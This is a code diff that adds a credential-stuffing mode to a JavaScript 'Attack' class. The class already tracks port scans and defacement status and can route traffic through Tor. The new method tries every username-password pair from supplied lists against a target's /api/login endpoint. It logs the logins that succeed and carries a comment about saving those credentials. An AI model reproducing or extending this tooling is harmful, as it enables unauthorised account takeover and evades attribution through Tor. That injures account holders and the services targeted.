@@ -17,6 +17,7 @@ class Attack {
       lastError: null,
       openPorts: [],
       defacementStatus: 'Ready',
+      credentialStatus: 'Idle',
     };
     this.intervalId = null;
     this.attackInstance = null;
@@ -75,6 +76,9 @@ class Attack {
         break;
       case 'connection':
         await this.executeConnectionAttack();
+        break;
+      case 'credential':
+        await this.executeCredentialStuffing();
         break;
       default:
         throw new Error(`Unknown attack type: ${this.type}`);
@@ -230,6 +234,75 @@ class Attack {
 
     this.stats.status = `Connection Scan Complete. Open ports: ${this.stats.openPorts.join(', ') || 'None'}`;
   }
+
+  async executeCredentialStuffing() {
+    this.stats.status = 'Initializing Credential Stuffing';
+    this.stats.credentialStatus = 'Running';
+
+    try {
+      const { usernameList, passwordList } = this.options;
+
+      if (!usernameList || !passwordList) {
+        throw new Error('Username and password lists are required for credential stuffing.');
+      }
+
+      const usernames = usernameList.split('\n').map(u => u.trim()).filter(u => u);
+      const passwords = passwordList.split('\n').map(p => p.trim()).filter(p => p);
+
+      let attempts = 0;
+      let successfulAttempts = 0;
+
+      for (const username of usernames) {
+        for (const password of passwords) {
+          if (!this.isRunning) break;
+          attempts++;
+
+          this.stats.credentialStatus = `Attempting: ${username}:${password} (${attempts} attempts)`;
+
+          try {
+            const formData = new URLSearchParams();
+            formData.append('username', username);
+            formData.append('password', password);
+
+            const axiosClient = this.isTor ? this.axiosTorInstance : this.axiosInstance;
+            const response = await axiosClient.post('/api/login', formData, {
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+              },
+              signal: this.abortController.signal,
+              timeout: 10000
+            });
+
+            if (response.status === 200) {
+              const data = response.data;
+              if (data.success) {
+                successfulAttempts++;
+                console.log(`Successful login: ${username}:${password}`);
+                // Handle successful login (e.g., save credentials)
+              } else {
+                console.log(`Failed login: ${username}:${password} - ${data.message || 'Unknown error'}`);
+              }
+            } else {
+              console.log(`Failed login: ${username}:${password} - HTTP ${response.status}`);
+            }
+          } catch (error) {
+            console.error(`Error attempting login: ${username}:${password}`, error);
+            this.handleAttackError(error);
+          }
+        }
+        if (!this.isRunning) break;
+      }
+
+      this.stats.credentialStatus = `Credential stuffing complete. Attempts: ${attempts}, Successes: ${successfulAttempts}`;
+      this.stats.status = 'Credential Stuffing Complete';
+
+    } catch (error) {
+      console.error('Credential stuffing failed:', error);
+      this.stats.credentialStatus = 'Failed';
+      this.handleAttackError(error);
+    }
+  }
+
 
   bufferData(data) {
     this.dataBuffer.push(data);
